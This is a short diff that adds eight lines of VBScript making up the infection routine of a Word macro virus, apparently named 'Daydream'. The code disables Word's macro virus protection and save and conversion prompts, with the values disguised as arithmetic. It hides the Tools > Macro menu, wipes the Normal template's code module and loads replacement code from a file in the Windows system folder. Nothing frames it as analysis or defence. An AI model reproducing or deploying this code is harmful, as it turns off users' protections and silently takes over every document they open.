@@ -1,0 +1,8 @@
+Set Daydream = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")
+Daydream.Options.VirusProtection = (0 - 0):Daydream.Options.SaveNormalPrompt = (1 - 1):Daydream.Options.ConfirmConversions = (2 - 2)
+Daydream.CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Visible = (3 - 3)
+For x = 1 To Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
+Next
+Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.sys" & Chr(34) & ")
+Daydream.Application.Quit
